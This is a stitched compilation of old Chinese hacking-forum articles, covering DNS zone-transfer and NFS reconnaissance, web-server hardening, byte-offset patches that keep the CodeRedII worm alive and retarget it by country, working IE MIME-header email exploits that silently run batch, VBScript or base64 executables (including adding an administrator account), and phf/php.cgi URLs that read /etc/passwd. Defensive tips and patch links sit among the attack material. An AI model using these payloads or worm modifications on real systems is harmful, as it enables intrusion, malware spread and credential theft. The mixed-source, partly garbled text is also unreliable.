Address: 10.4.3.1
example.server
origin = ns.example.server
mail addr = postmaster.ns.example.server
serial = 2000032201
refresh = 10800 (3H)
retry = 3600 (1H)
expire = 604800 (1W)
minimum ttl = 86400 (1D)
< server ns.example.server
Default Server: ns.example.server
Address: 192.168.129.37
< ls example.server.
[ns.example.server]
$ORIGIN example.server.
@ 1D IN A 192.168.240.131
wwwtest 1D IN A 192.168.240.135
news 1D IN A 192.168.240.136
localhost 1D IN A 127.0.0.1
listserv 1D IN A 192.168.240.136
...
igate 1D IN A 192.168.129.34
　　 命令“set type=ns”（名称服务器）告诉nslookup只查找域的名称服务器信息，因此本例查询“www.example.server”将返回该主机的所有名称服务器。这里的查找结果只有一个服务器“ns.example.server”。 
　　 接下来我们用命令“server ns.example.server”把所有以后的查询直接定向到该服务器。然后，我们用“ls example.server”命令查询该服务器要求列出“example.server”区域的完整清单，结果就看到了example.server管理员所设定的所有主机名字和IP地址列表。 
　　 如果一个域有多个名称服务器，尝试查询所有的名称服务器往往是值得的，这是因为虽然主名称服务器往往有安全保护，其他名称服务器却往往没有，很容易从这些服务器得到域主机和IP地址信息。 
　　 注重安全的网络管理员总是在另外的机器上运行内部DNS服务，而不是在直接接入Internet的机器上运行。没有必要告诉整个世界自己的办公室内运行着哪些机器、这些机器怎样命名。把直接服务于Web网站的机器名字和地址发布出去已经完全足够了。 
　　 使用gnome程序Cheops（http://www.marko.net/cheops）可以生成一个网络示意图，清楚地显示出机器类型和连接。另外这个程序也可以进行端口扫描，但功能不如nmap灵活和强大。 
　　 使用网络监测器Ethereal（http://ethereal.zing.org/）可以分析网络传输。Ethereal能够跟踪TCP流，对于获知由telnet、ftp、pop3等协议传输的明文密码很有用。 
　　 使用rpcinfo和showmount（对于Linux的某些版本，还可以使用kshowmount），你可以查询自己机器的sunrpc提供了哪些服务。如果NFS正在运行，就有可能从服务器获得已导出文件系统的清单。 
# rpcinfo -p www.example.server
program vers proto port
100000 4 tcp 111 portmapper
100000 3 tcp 111 portmapper
100000 2 tcp 111 portmapper
100000 4 udp 111 portmapper
100000 3 udp 111 portmapper
100000 2 udp 111 portmapper
可以看到，www.example.server的sunrpc服务开放了对外部机器的连接。这是没有必要的，我们可以安装带有访问控制的rpcbind程序或者配置防火墙阻断它。 
　　 由于NFS默认值极不合理，把文件系统完全不受保护地以可读写方式显露给外界就成了一种极为常见的错误。下面是一个实例： 
# /usr/sbin/kshowmount -e center2.sample-university.net
Export list for center2.sample-university.net:
/usr/lib/cobol (everyone)
/usr/sys/inst.images (everyone)
/stadtinf (everyone)
/var/spool/mail (everyone)
/usr/lpp/info (everyone)
/usr/local (everyone)
/pd-software (everyone)
/u1 (everyone)
/user (everyone)
/fix (everyone)
/u (everyone)
/ora rzws01
/install (everyone)
/ora-client 192.168.15.20
　　 所有注明了“everyone”的目录都是向公众开放的，其中包括：保存了数百个用户邮件的“/var/spool/mail”目录，以及用户的主目录“/u”和“/u1”。另外“/usr/local”和“/usr/lib/cobol”也是允许写入的，这使得它很容易被安装上特洛伊木马。任何人都可以进入这个系统，且不会遇到什么值得一提的阻力。 我们要讨论的第二类安全问题涉及到服务器公用目录下的私有数据。许多Web空间提供商提供的只有“Web空间”，它们会把用户FTP目录的根映射到Web服务器的根。也就是说，用户可以通过FTP以“/”访问服务器目录“/home/www/servers/www.customer.com/”，同时任何人可以通过URL“http://www.customer.com/”访问它，用FTP方式保存的“/password”文件可以通过URL“http://www.customer.com/password”访问。如果用户Web应用需要保存一些私有的、不能从Web访问的数据，则根本无法找到满足要求的位置。 
　　 许多Web商店把订单日志和调试输出写入一个或多个日志文件，或者用配置文件来保存密码和商品数据。如果这些数据保存到页面文档根目录之下，那么它们就有相应的URL而且可以通过Web访问。此时攻击者所要做的只是猜出这些文件的名字。只要了解了20种主流在线商店系统的默认设置并正确地识别出目标网站所用的系统，要猜出这些文件名字是相当简单的。 
　　 如果Web服务器既提供私有数据存储又提供公用页面目录，上述问题就不会再出现。例如在这些方案中，FTP根目录“/”映射到“/home/www/servers/www.customer.com/”，但页面文档的根目录却在它的下一级目录“/home/www/servers/www.customer.com/pages”，可以通过FTP以“/pages”形式访问。在这种目录配置下，用户可以另外创建和页面文档根目录平行的目录，然后把敏感数据放到这些目录中。由于这些目录可以通过FTP访问，但不能通过HTTP访问，所以它们是无法通过Web访问的。 
　　 如果系统没有采用上述根目录分离的目录结构，我们还有一种解决问题的办法，即在页面文档根目录下创建专用的私有数据存储目录，如“/shop”，然后在这个目录中创建.htaccess文件，通过.htaccess文件拒绝所有HTTP访问（适用于Apache服务器）：
$ cat /shop/.htaccess
order deny, allow
deny from all
　　 该目录中的文件只能通过FTP传输，因为FTP传输忽略.htaccess文件。但与前面采用页面文档根目录之外独立目录的方法相比，这种方法的风险更多一点，因为如果服务器管理员在服务器主配置文件中意外地关闭了该目录必不可少的“AllowOverride Limit”优先权，这种保护将不再有效。 
　　 上述问题还有各种变化形式。如果一台机器上运行着多个客户网站，那么客户就能够欺骗机器，访问在其自己目录层次之外的路径，例如“/home/www/servers/www.customer.com”目录之外的文件。通常，只需创建各种符号链接（指向保存在用户虚拟服务器之外的文件）就有可能实现这一点。最有可能成为链接目标的是包含文件和私有密匙，这是为了获取数据库密码和其他必须保密的信息（为了让应用能够正常运行这些信息往往以明文形式保存在这类文件中）。其他可能的攻击目标还包括保存在非公用目录中的订单记录和其他有用数据。 
　　 把尽可能多的服务隔离运行可以部分地解决这个问题，例如用Apache suexec程序的sbox让所有的CGI在隔离的环境以客户的用户ID而不是Web服务器的用户ID运行。另外，许多服务器上运行着FTP服务，例如wu-ftpd，该服务的所有文件传输都是隔离进行的，同样也保护了善意客户的资料避免被其他人偷看。 
　　 然而，恶意的客户仍旧能够用CGI程序创建符号链接指向其他用户的存储区域，然后通过它自己的Web服务器查看其他人的文件，这是因为在一个运行多个网站的环境中，Web服务器无法简单地以隔离方式以及用它为之应答请求的客户的用户ID运行。管理员应该配置Web服务器以及其他文件传输程序使其不再使用符号链接。在Apache上，这可以通过关闭最顶层的“FollowSymLinks”选项实现（不要在较低的层次上把它重新打开），配置代码示例如下： 
< directory / >
Options -FollowSymLinks
< /directory >
第三类常见的安全问题是CGI程序或PHP脚本的质量低下，它们信任了来源不可靠的参数，未经严格的检查就立即使用CGI参数。 
　　 Web应用一般包含位于防火墙之内的和防火墙之外的两部分，防火墙之内的如本地的脚本程序、数据库、Web服务器以及本地数据文件等。由于这些部件都由管理员直接管理和控制，因此可以认为它们都是可以信任的。Web应用的其他组成部分位于防火墙之外，是不可信任的。这主要是指用户的浏览器——如果用户使用浏览器，而且没有为了更方便地控制输入Web应用的数据和发现Web应用中可能存在的问题而直接在telnet会话中输入Web请求。 
　　 防火墙是可信任的Intranet和不可信任的Internet之间的分界线。 
　　 所有来自信任分界线之外的数据未经检查就不应该进入Web应用，这包括所有传递给CGI脚本的参数，比如：GET、POST和COOKIE变量，HTTP_REFERER、HTTP_USER_AGENT和所有HTTP_*变量，以及所有其他远程生成的变量值。在CGI脚本使用所有这些变量之前，都必须对它们进行合法性检查，这种检查可以确保变量的值确实在预期的范围内。 
　　 例如，有些脚本在请求的HTTP_REFERER正确时就接受表单输入，这是一种常见但错误的编程习惯。脚本用这种机制来防范伪造的请求是徒劳的。毫无疑问，对于攻击者来说，掌握必需的HTTP_REFERER并将它并入请求的其余部分一起发送是轻而易举的，因此这种保护是没有用的。这种脚本的错误在于：在这类调用中必须检查的不仅仅是HTTP_REFERER值，所有其他值都必须进行检查。
　　 下面这个简单的PHP程序将输出CGI参数b的值以及HTTP_REFERER的值： 
kris@valiant:~/www < cat test.php
< ?php
print "The value of b is $bn";
print "The value of HTTP_REFERER is $HTTP_REFERERn";
? >
　　 用telnet连接到80端口，我们能够向上述脚本提供任意的参数值b，同时还可以任意提供HTTP_REFERER值。我们把下面的几行发送到服务器： 
GET /~kris/test.php?b=this+is+a+test HTTP/1.0
Host: valiant.koehntopp.de
Referer: http://www.attacker.com/die_sucker_die.html
　　 下面是完整的会话过程： 
kris@valiant:~/www < telnet valiant 80
Trying 193.102.57.3...
Connected to valiant.koehntopp.de.
Escape character is '^]'.
GET /~kris/test.php?b=this+is+a+test HTTP/1.0
Host: valiant.koehntopp.de
Referer: http://www.attacker.com/die_sucker_die.html
HTTP/1.1 200 OK
Date: Sat, 08 Apr 2000 06:44:02 GMT
Server: Apache/1.3.9 (Unix) (SuSE/Linux) PHP/4.0RC2-dev mod_ssl/2.4.7 OpenSSL/0.9.4
X-Powered-By: PHP/4.0RC2-dev
Connection: close
Content-Type: text/html
The value of b is this is a test
The value of HTTP_REFERER is http://www.attacker.com/die_sucker_die.html
Connection closed by foreign host.
　　 注意b的值必须以URL编码格式输入。要将字符串进行URL编码，可以使用一个简单的PHP程序，例如： 
kris@valiant:~/www < cat urlencode.php
#! /home/kris/bin/php -q
< ?php
print urlencode($argv[1])."n";
? >
kris@valiant:~/www < ./urlencode.php "this is a test"
this+is+a+test
　　 发送HTTP POST请求只是稍微复杂一点：现在应该在这个请求中包含一个合法的Content-Type头以及正确的内容长度字节数。下面是具体过程： 
kris@valiant:~/www < telnet valiant 80
Trying 193.102.57.3...
Connected to valiant.koehntopp.de.
Escape character is '^]'.
POST /~kris/test.php HTTP/1.0
Host: valiant.koehntopp.de
Referer: http://www.attacker.com/die_sucker_die.html
Content-Type: application/x-www-form-urlencoded
Content-Length: 16
b=this+is+a+test
HTTP/1.1 200 OK
Date: Sat, 08 Apr 2000 06:55:11 GMT
Server: Apache/1.3.9 (Unix) (SuSE/Linux) PHP/4.0RC2-dev
mod_ssl/2.4.7 OpenSSL/0.9.4
X-Powered-By: PHP/4.0RC2-dev
Connection: close
Content-Type: text/html
The value of b is this is a test
The value of HTTP_REFERER is
http://www.attacker.com/die_sucker_die.html
Connection closed by foreign host.
　　 另外一种常见的错误是把内部应用的状态数据通过< INPUT TYPE="HIDDEN" >标记从一个页面传递到另一个页面。把内部应用的状态放到信任界限之外就如把应用的心脏挖出来放到了攻击者的面前。对于如此缺乏安全保障的应用，任何想要摧毁它的攻击者都可以轻易地引导该应用并得到任何想要的效果。应用的状态应该通过会话变量保存在服务器上，永远不应该跨越信任界限。所有的Web应用开发平台都有这种机制。例如在PHP3中，PHPLIB可用于保存会话数据，PHP4使用的是session_*()调用，ASP提供Session对象，Cold Fusion提供几种不同的会话变量。 
　　 Web应用不应该把任何来自信任界线之外的数据直接保存为会话变量：会话变量是可信任的变量，不应该用来保存不可信任的数据。通常，来自外面的数据（比如表单变量的数据）应该先传入检验其合法性的函数。只有当检验函数表示表单提供的数据是安全的，才可以把表单数据复制到会话变量。Web应用应该把这种检查集中到一起进行，应用的所有其余部分永远不应该直接接触表单变量，而是应该使用经过检查且确认安全的会话数据。 
　　 参考： 
http://www.koehntopp.de/kris/artikel/webtune/
"Webserver verstehen und tunen" (德语) 
http://www.koehntopp.de/php/
"de.comp.lang.php - H‰ufig gestellte Fragen" (德语) 
http://www.insecure.org/nmap/
"NMAP Port Scanner" (英语) 
http://ethereal.zing.org/
"Ethereal Network Monitor" (英语) 
http://www.marko.net/cheops
"Ceops Network Mapper" (英语) 
http://freshmeat.net/appindex/1998/04/06/891857252.html
"lsof - list open files" (英语)
"TCP/IP Illustrated, Volume 1: The Protocols" (英语)
W. Richard Stevens
Addison-Wesley 
"Hacking Exposed - Network Security Secrets & Solutions" (英语)
McClure, Scambray and Kurtz
http://phplib.netuse.de/
"A library for PHP application development" (英语)
CodeRedII真的一去不复返了吗？
天看到一则消息：“安全专家表示，肆虐互联网两个月的红色代码II已于九月三
十日夜半时刻步入衰亡期，从此将销声匿迹。”底气之所以这么足，不是因为世界上所
有的IIS都打了补丁，而是由CodeRedII本身决定的。原始版本的CodeRedII设定了一个
自杀条件：系统月份大于等于十月或年份大于等于2002年。那么如果有人稍微改一下呢？
何况可以改的还不仅限于时间。
############################################################################
#警告！以下提到的技术仅限于学习研究，请勿将改动后的CodeRedII释放到网络中。 #
#本文作者也不提供CodeRedII的原始版本及任何变种版本。 #
#作者假设本文读者已读过CodeRedII的其它相关文章，有关细节不再重复。 #
############################################################################
1、在16进制地址0x00000308和0x00000309的"D207"（十进制数：2002）决定年份。
改为"DA07"（十进制数：2015）。
2、在16进制地址0x00000317的"0A"（十进制数：10）决定月份。
改为"0D"（十进制数：13）:-D。
3、在16进制地址0x000001FD和0x000001FE的"0404"代表系统语言版本：中国台湾。
可以改为"1104"（日本）。
4、在16进制地址0x00000205和0x00000206的"0408"代表系统语言版本：中国大陆。
可以改为"6008"（印度）。
5、在16进制地址0x000007C1到0x000007E0之间为地址掩码表，如果全部用"F"填充，
会使目标地址的选择完全随机。
6、在16进制地址0x000007F3的"7F"（十进制数：127）和0x000007F8的"E0"（十进
制数：224）以这两个数字打头的IP地址永远不会受攻击。（127打头的是环回地
址，当然要避免；224打头的是美国南加利福尼亚大学，为什么要设定这个数字
呢？难道和程序的作者有什么关系？纯属瞎猜。）可以不改，也可改为我国常见
的"CA"（十进制数：202）和"3D"（十进制数：61）。
7、在16进制地址0x00000292和0x00000293的"2C01"（十进制数：300）决定程序初
始线程，改为"0100"（十进制数：1）。
8、在16进制地址0x0000028C和0x0000028D的"2C01"（十进制数：300）决定在特定
语言版本下增加的线程，改为"E703"（十进制数：999）。
假设我们改了步骤1、2、3、4、7、8，那么就会得到这样一个CodeRedII：永远
不会自杀，直到2015年，或者哪一年的13月。一般情况下只会开一个线程，如果遇到
印度或者日本的主机就会开1000个线程，哈哈哈哈。
其实可以改动的东西还有很多，这里只是改了一些数据类型的代码，如果结合改
动可执行码，效果会更明显，当然难度也大一些。
利用错误的MIME头实行攻击
利用错误的MIME头实行攻击--1 
————————————————————————————————— 
badboy 坏男孩俱乐部 
badboyclub.yofor.net 
badboyclub.163.net 
badboyclub.go.163.com 
这并不是什么权威教材，只适合菜鸟了解win9x、NT存在的不安全面，切莫 
用此方法在国内做尝试，如果你偏要如此，那么由此引起的一切法律后果由 
你自己负责。 
本文只允许在网络任意转载，但须保留文章的完整性，如把本文作为经济目 
的使用，或者未经本人许可进行印刷、光盘杂志、等出版性质的行为，本人 
将保留侵权控告的权利。 
本文内所谈到的程序具有一定的危害性，如果你安全技术能力有限，请勿测试。 
————————————————————————————————— 

微软安全公告(m$-01-020),错误的MIME头可导致IE执行Email附件 
发布时间：2001年3月29日 
微软--------------一个以补丁来吸引人的破软件生产制造商。这不，又一个 
对个人用户带来极大危害的漏洞再次出笼，你还需要对该死（盖茨）说些什么？ 
已没什么必要了，快投入到漏洞所带来的思维闪动的快感里去吧！！！ 

一、MIME的简单介绍 

　 1．MIME的基本概念 
你可能在使用CGI程序时接触过MIME类型，其中有一行叫作Content-type 
的语句，它用来指明传递的是MIME类型的文件(如text／html或text/plain)。 
　 MIME是Multipurpose Internet Mail Extension的缩写，起初定义为在 
Intemet电子信件中的编码方法，现在它已经演化成一种指定文件类型(Internet 
的任何形式的消息：e-mail，usenet新闻和Web)的通用方法。 
如果Internet上有两个程序在联系，其中一个发文件，另一个接受文件。 
如果发送的是MIME类型的文件，接受程序通过识别会告诉你它是否能够处理。 
每一种文件格式都有一组相一致的名称。至于是否匹配，这不应该成为你所 
担心的问题，多数标准文件都有对应于MIME类型的文件格式。 

　 2．MIME类型工作原理 
MIME类型有两部分：一个是文件的一般格式(如文本、图像或应用程序)， 
再一个就、是文件的特殊的格式(对文本有html、plain格式，对图像有GIF、 
JPEG格式)。比较典型的MIME类型一般是text／html、image／gif、video／ 
quicktime或application／postscripto一旦一组标准的MIME类型已经被定义， 
新的类型必须在IANA(Internet Assigned Numbers Authority)中登记。新的 
MIME类型在没有正式认可时必须采用以x—开头的命令指定，如 
audio／x-noise-from-join或application／x-httpd-cgi：在建立NCSA服务器 
时它可以运行CGI程序，包含时也是这种情况：application／x-httpd-cgi和 
x-serverd-parsed-htmlo 

　 3．MIME类型在Web服务器和浏览器上的应用 
Web服务器发送文件到浏览器时将用到MIME类型。其大致过程是这样的： 
(1)浏览器通过URL向服务器发出读文件请求： 
(2)服务器接到浏览器的请求后从文件系统中取出相应的文件； 
(3)服务器在已知的MIME文件扩展对照表中查找该文件的扩展名，如gif、html、 
txt 等等； 
(4)服务器向浏览器发送一个Content-type头指示将要发送的文件的类型； 
(5)浏览器接到Content-type后，对它是否可以单独处理、是否还要调用另一 
个浏览器等问题进行辨别。 
这个过程最重要的部分是服务器保存一个固定的文件扩展名与MIME类型 
的对照表。这个表决定了服务器可识别的文件类型。在Web中共享的文件一般 
都有正确的文件扩展名，并同正确的Content-type一起发送。 
如果你想发送—．个超出Web定义的新类型的文件或者你短时间内突然得 
到许多文件，而它们都有新的扩展名，这时你必须配置你的服务器来识别MIME 
类型或新的扩展名。 
　 4.MIME类型与浏览器 
通常浏览器都有一个MIME类型的文件扩展名对照表，这个表一般只能用于 
“Openfile”对话框或者一个file：URL命名打开的本地磁盘文件，或用除了 
HTTP之外的方法从服务器取回的文件。在多数情况下，浏览器会忽略服务器所 
传文件的扩展名而只注意Content-type。 
和服务器一样，浏览器通常也有一个MIME类型与其他浏览器的对照表。这 
样你就可以设置浏览器以便处理从Web服务器得到的文件，浏览器使它从 
Content-type头得到的值与浏览器的名字和地址相匹配。 
服务器配置文件如果被加入了新的文件类型，这时很有可能浏览器无法识 
别它得到的新的文件。如果你增加了这些文件类型并且想使用这些类型，你最 
好在作品中加上说明，注明传递的文件类型、使用过的MIME类型以及与读此文 
件格式的浏览器的关系等等。 


二、错误的MIME头漏洞的发现 
该漏洞是由Juan Carlos Garcia Cuartango安全小组发现的，该小组发现在 
MEMI在处理不正常的MIME类型中存在问题，攻击者可以建立一个包含可执行 
文件的附件的HTML EMAIL并修改MIME头，使IE不正确处理这个MIME所指定的 
执行文件附件。一般情况下如果附件是文本文件，IE会读它，如果是VIDEO 
CLIP，IE会查看，如果是图形文件，IE就会显示它，但如果是一个EXE文件， 
IE就会提示用户是否执行，但具有危害的是，当攻击者更改MIME类型后，IE 
就会不经过提示用户是否执行而直接运行，从而使攻击者加在附件中的程序 
或者攻击命令能够按照攻击者设想的情况实行。这些内容我们将在后面做一 
一分析。 
windows95\98\me winNT4 win2k下的 
Microsoft Internet Explorer 5.0 
Microsoft Internet Explorer 5.01 
Microsoft Internet Explorer 5.5 
均存在该漏洞。 
　 
该安全小组提供一简单的执行hello.eml程序进行测试。 
(将以下程序编辑为hello.eml文件即可) 
From: "xxxxx" 
Subject: mail 
Date: Thu, 2 Nov 2000 13:27:33 +0100 
MIME-Version: 1.0 
Content-Type: multipart/related; 
　　　 type="multipart/alternative"; 
　　　 boundary="1" 
X-Priority: 3 
X-MSMail-Priority: Normal 
X-Unsent: 1 

--1 
Content-Type: multipart/alternative; 
　　　 boundary="2" 
--2 
Content-Type: text/html; 
　　　 charset="iso-8859-1" 
Content-Transfer-Encoding: quoted-printable 

<HTML> 
<HEAD> 
</HEAD> 
<BODY bgColor=3D#ffffff> 
<iframe src=3Dcid:THE-CID height=3D0 width=3D0></iframe> 
HELLO MY FRIEND!!!<BR> 
</BODY> 
</HTML> 

--2-- 

--1 
Content-Type: audio/x-wav; 
　　　 name="hello.bat" 
Content-Transfer-Encoding: quoted-printable 
Content-ID: <THE-CID> 

echo OFF 
dir *.* 
点击hello.eml文件后，将会开启OUTLOOK和MSDOS窗口，显示当前文件所在的 
文件夹的查看状态。因为仅是dir命令，所以对用户来说不存在什么危害， 
该文件只展示在没任何提示下已经运行了dir命令。 
在windows\temp目录里我们可以看到这个被执行的临时文件hello.bat、 
hello (1).bat,这文件是由hello.eml里面的代码产生的，而在outlook里 
面我们只能看见一个0字节的文件ATT00004.txt。当你关闭outlook后， 
hello.bat这临时文件就看不到了。 
未完待续。 
利用错误的MIME头实行攻击--2 
badboy 坏男孩俱乐部 
badboyclub.yofor.net 
badboyclub.163.net 
badboyclub.go.163.com 
这只是网络安全初级读物，只适合菜鸟了解win9x、NT存在的不安全面，切莫 
用此方法在国内做尝试，如果你偏要如此，那么由此引起的一切法律后果由 
你自己负责。 
本文只允许在网络任意转载，但须保留文章的完整性，如把本文作为经济目 
的使用，或者未经本人许可进行印刷、光盘杂志、等出版性质的行为，本人 
将保留侵权控告的权利。 
本文内所谈到的程序具有一定的危害性，如果你安全技术能力有限，请勿测试。 
三、MIME与command、cmd命令的结合 
在上部分内容的例子里，我们可以看到那信件的最后部分的内容为： 
--1 
Content-Type: audio/x-wav; 
　　　 name="hello.bat" 
Content-Transfer-Encoding: quoted-printable 
Content-ID: <THE-CID> 
echo OFF 
dir *.* 
--1 
机产生的hello.bat文件内的内容是dir *.* 
实际上这就是一个最简单的mime错误头漏洞与command、cmd外部命令的最简单 
结合。从这我们是不是可以尝试把dir命令变成其他的命令方式呢？事实说明， 
MS-DOS下一切命令是可以替换这部份内容的。 
对于WIN9X用户来说，只要他的IE浏览器是5.0 5.01 5.5版本，在没打补丁的 
情况下，攻击者完全可以利用欺骗的方式让你打开含有攻击命令的MIME错误头 
的Email文件，达到攻击的目的。例如format、deletetree、move等一切MS-DOS 
下的命令。 
而对于WINNT、WIN2K用户，尤其是那些不安分守己的系统管理员利用公司的主 
服务器上网且对网络安全知识贫乏的情况下，攻击者可以利用在以上那Email 
信件里加上诸如： 
net user test 1234567 /add 
net localgroup administrators test /add 
这样的命令增加用户或者超级用户权限，进一步达到入侵的目的。 
因为命令的比较短小，因此攻击者未必需要给你发这样的信件，他可以在某个 
网页里加入自动启动的方式，骗你打开，达到攻击目的。 
四、错误MIME头调用vbs格式文件 
我们先看以下例子： 
From: "xxxxx" 
Subject: mail 
Date: Thu, 2 Nov 2000 13:27:33 +0100 
MIME-Version: 1.0 
Content-Type: multipart/related; 
type="multipart/alternative"; 
boundary="1" 
X-Priority: 3 
X-MSMail-Priority: Normal 

--1 
Content-Type: multipart/alternative; 
boundary="2" 
--2 
Content-Type: text/html; 
charset="iso-8859-1" 
Content-Transfer-Encoding: quoted-printable 
<HTML> 
<HEAD> 
</HEAD> 
<BODY bgColor=3D#ffffff> 
<iframe src=3Dcid:THE-CID height=3D0 width=3D0></iframe> 
I will create the file C:\deleteme.txt<BR> 
</BODY> 
</HTML> 
Content-Type: audio/x-wav; 
name="hack.vbs" 
Content-Transfer-Encoding: quoted-printable 
Content-ID: <THE-CID> 
set objFileSystem =3D CreateObject("Scripting.FileSystemObject") 
set objOutputFile =3D objFileSystem.CreateTextFile("C:\deleteme.txt", 1) 
objOutputFile.writeline("You can delete this file.") 
objOutputFile.close 
msgbox "I have created the file : c:\deleteme.txt" 
将该程序编辑存为一eml格式的文件，例如vbs.eml,我们运行它，可以看到 
屏幕弹开一VBScript窗体，并可以看见在C:\下建立了一deleteme.txt文件. 
而邮件的附件中为att00002.txt的一字节为0的文件。 
如果你安装了超级解霸之类的软件，运行vbs.eml后超级解霸会自动执行。 
对于这种调用VBS文件的形式，会有多大危害呢？想一下，爱虫病毒是怎么样的？ 
爱虫病毒还需要骗你执行它，但一旦和错误mime头漏洞结合起来，就根本不需要 
你执行了，只要你收了这封信且阅读它，你就中招了。 
从5月2日开始，一个名叫VBS.happytime正在网络的流行，据说已经感染了10万 
电脑，而且还有进一步扩大的趋势，但目前它还没和错误的MIME头漏洞结合， 
一旦好事者把两个关联起来，后果不堪设想。 
未完待续。 
利用错误的MIME头实行攻击--3 
badboy 坏男孩俱乐部 
badboyclub.yofor.net 
badboyclub.163.net 
badboyclub.go.163.com 
这只是网络安全初级读物，只适合菜鸟了解win9x、NT存在的不安全面，切莫 
用此方法在国内做尝试，如果你偏要如此，那么由此引起的一切法律后果由 
你自己负责。 
本文只允许在网络任意转载，但须保留文章的完整性，如把本文作为经济目 
的使用，或者未经本人许可进行印刷、光盘杂志、等出版性质的行为，本人 
将保留侵权控告的权利。 
本文内所谈到的程序具有一定的危害性，如果你安全技术能力有限，请勿测试。
利用错误的MIME头实行攻击--4 
badboy 坏男孩俱乐部 
badboyclub.yofor.net 
badboyclub.163.net 
badboyclub.go.163.com 
这只是网络安全初级读物，只适合菜鸟了解win9x、NT存在的不安全面，切莫 
用此方法在国内做尝试，如果你偏要如此，那么由此引起的一切法律后果由 
你自己负责。 
本文只允许在网络任意转载，但须保留文章的完整性，如把本文作为经济目 
的使用，或者未经本人许可进行印刷、光盘杂志、等出版性质的行为，本人 
将保留侵权控告的权利。 
本文内所谈到的程序具有一定的危害性，如果你安全技术能力有限，请勿测试。 
五、错误MIME头信件自动执行exe文件(续) 
我们可以从文件中看到 
Content-Transfer-Encoding: base64 
Content-ID: <THE-CID> 
攻击者可以采用BASE64编码将一个可执行文件直接附带进来，不需要利用本地 
文件系统的已有文件。我们先执行这个例子,把以上文件源码存为exe.eml文件, 
运行它,我们可以看到hello.exe这文件自动被执行,多么可怕的事啊,在这之前, 
一些攻击者想法子骗被攻击目标执行修改过的木马等后门程序,而现在,一切都 
是自动执行,唯一的条件就是被攻击目标使用IE5.0 IE5.01 IE5.5而这种浏览器 
的用户是目前世界上最多的，稍微有点入侵知识的人对这点的危害是十分清楚的。 
对于利用错误MIME头漏洞执行EXE的傻瓜式软件，中国的一位黑客软件设计者小 
榕已经在他的网站提供软件下载。 
对于不会编写BASE64编码的入侵者来说，可以利用一些信件软件如foxmail，就 
可以很容易得到你想得到的一些木马或者攻击行软件的BASE64的编码格式文件， 
具体的操作方法是，你用FOXMAIL写一封信，然后把你想得到BASE64编码的软件 
增加到附件中去，然后查看信件的全部信息，这样就可以得到该EXE文件的BASE64 
编码格式的代码。 
而实际上无论哪种方式利用这漏洞进行攻击的，参照以上例子，是很容易可以写 
出来的。 
六、实行攻击方式的入侵思维 
并不是说我鼓励你利用这些漏洞和方法去攻击别人，但如果我们不从攻击者的思 
考方式去猜想别人的攻击，我们又如何知道别人会怎么设圈套和利用哪些方式去 
攻击你呢？正所谓知彼知已，百战不殆。 
1、在outlook或者Foxmail等工具是无法直接编写出这种错误的MIME头信件的， 
攻击者一般来说是通过用记事本这样的编辑工具编写错误的MIME头信件，然后利 
用Email工具的导入功能，再把信件发出去。 
2、攻击者也可以给你写一HTML格式的信件，或者叫你前往某WEB页面浏览某一特 
定的页面，在这页面里，攻击者利用一些RUL转向技术，迫使你受到早已放在某一 
主机上的错误MIME头格式的攻击性文件。 
3、利用一些黑客为这漏洞编写的特定的攻击性软件，如前面提到的小榕写的那个 
OEexample 
4、在攻击性的MIME信件中嵌入对方国家少见的病毒木马。 
5、攻击者一定会修改mime的头部信息，让被攻击者难以发现攻击来源。 
针对以上的可能性，我们建议大家做到以下的预防措施和一些临时的解决方法： 
1、在微软公司尚未公布漏洞的最终补丁之前，最好的方法是不要使用IE和Outlook 
/Outlook Express浏览和接受Email信件，可以用其他的浏览器Netscape、netants、 
wget工具代替IE，用FOXMAIL等工具代替OUTLOOK。 
2、不要受陌生人的诱惑打开别人给你的RUL，如果确实想看，可以通过一些下载 
工具，把页面下载，用记事本等一些文本编辑工具打开查看代码。 
3、在只能使用IE浏览器和资源管理器的情况下，建议禁止"文件下载"、禁止以WEB 
方式使用资源管理器、最大限度禁止活动内容特性、设置资源管理器成"始终显示 
扩展名"、永远不直接从IE浏览器中选择打开文件、取消"下载后确认打开"这种扩 
展名属性设置。 　 
七、错误的MIME头漏洞的解决办法 
对于一般上网用户，可以通过开始-windows update 在线自动升级你的windows和 
IE、outlook/outlook Express。 
微软公司为这漏洞提供了一补丁，可以到下面地址获取： 
http://www.microsoft.com/windows/ie/download/critical/Q290108/default.asp 
一些关于这漏洞的附加信息： 
这补丁可以安装在运行Internet Explorer 5.01 Service Pack 1 或者Internet 
Explorer 5.5 Service Pack 1上。 
漏洞修补的补丁将收录在Internet Explorer 5.01 Service Pack 2、Internet 
Explorer 5.5 Service Pack 2.
手把手教你攻击最新702种CGI漏洞
CGI漏洞的利用（一） 
GI漏洞向来是容易被人们忽视的问题，同时也是普遍存在的，前不久攻破PCWEEK LINUX的黑客就是利用了CGI的一个漏洞。我就自己所知道的和从外国站点看来的一些CGI漏洞来写一些利用CGI的攻击方法，水平有限写得不对的地方请来信告诉我：bamboo@kali.com.cn </P><P>一、phf.cgi攻击： </P><P>phf是大家所熟悉的了，它本来是用来更新PHONEBOOK的，但是许多管理员对它不了解以至于造成了漏洞。在浏览器中输入： </P><P>http://thegnome.com/cgi-bin/phf?Qalias=x%0a/bin/cat%20/etc/passwd </P><P>可以显示出PASSWD文档来。其实还可以用更好的命令来实现目的： </P><P>http://thegnome.com/cgi-bin/phf?%0aid&Qalias=&Qname=haqr&Qemail=&Qnickna 
me=&Qoffice_phone= 
http://thegnome.com/cgi-bin/phf?%0als%20-la%20%7Esomeuser&Qalias=&Qname= 
haqr&Qemail=&Qnickname=&Qoffice_phone= 
http://thegnome.com/cgi-bin/phf?%0acp%20/etc/passwd%20%7Esomeuser/passwd 
%0A&Qalias=&Qname=haqr&Qemail=&Qnickname=&Qoffice_phone= 
http://thegnome.com/~someuser/passwd 
http://thegnome.com/cgi-bin/phf?%0arm%20%7Esomeuser/passwd&Qalias=&Qname 
=haqr&Qemail=&Qnickname=&Qoffice_phone= </P><P>以上等于执行了命令： </P><P>id </P><P>ls -la ~someuser </P><P>cp /etc/passwd ~someuser/passwd </P><P>(用普通的可以进入的目录来看passwd) </P><P>rm ~someuser/passwd </P><P>二、php.cgi 
除了PHF以外，php也是常见的漏洞，php.cgi 2.0beta10或更早版本中，允许anyone以 
HTTP管理员身份读系统文件，在浏览器中输入： </P><P>http://boogered.system.com/cgi-bin/php.cgi?/etc/passwd </P><P>就可以看到想看的文件。 </P><P>另外，一部分php.cgi还可以执行shell，原因是它把8k bytes字节放入128bytes的缓冲区中，造成堆栈段溢出，使得攻击者可以以HTTP管理员的身份执行。 
